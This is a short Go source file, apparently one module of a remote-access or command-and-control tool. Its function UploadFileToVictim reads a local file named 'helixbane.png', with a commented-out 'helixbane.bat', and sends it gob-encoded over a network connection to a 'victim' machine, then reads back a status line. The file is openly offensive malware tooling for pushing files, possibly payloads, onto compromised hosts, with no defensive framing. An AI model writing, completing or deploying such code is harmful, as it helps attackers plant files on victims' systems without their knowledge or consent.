package upload

import (
	"bufio"
	"encoding/gob"
	"errors"
	"fmt"
	"net"
	"os"
)

type FileStruct struct {
	FileName    string
	FileSize    int
	FileContent []byte
}

func CheckFile(fileName string) bool {
	if _, err := os.Stat(fileName); err != nil {

		if os.IsNotExist(err) {
			return false
		}
	}
	return true
}

func ReadFileContents(fileName string) ([]byte, error) {
	file, err := os.Open(fileName)

	if err != nil {
		fmt.Println("[+] Unable to open file")
		return nil, err
	}

	defer file.Close()

	stats, _ := file.Stat()
	FileSize := stats.Size()

	bytes := make([]byte, FileSize)

	buffer := bufio.NewReader(file)

	_, err = buffer.Read(bytes)

	return bytes, err
}

func UploadFileToVictim(connection net.Conn) (err error) {
	// fileName := "helixbane.bat"
	fileName := "helixbane.png"

	fileExists := CheckFile(fileName)
	fmt.Println(fileExists)

	if !fileExists {
		err = errors.New("file not found")
		return err
	}

	contents, _ := ReadFileContents(fileName)

	fileSize := len(contents)

	fs := &FileStruct{
		FileName:    fileName,
		FileSize:    fileSize,
		FileContent: contents,
	}

	encoder := gob.NewEncoder(connection)

	err = encoder.Encode(fs)

	if err != nil {
		fmt.Println("[+] Error Encoding")
		return
	}

	reader := bufio.NewReader(connection)
	status, err := reader.ReadString('\n')

	fmt.Println(status)

	return
}
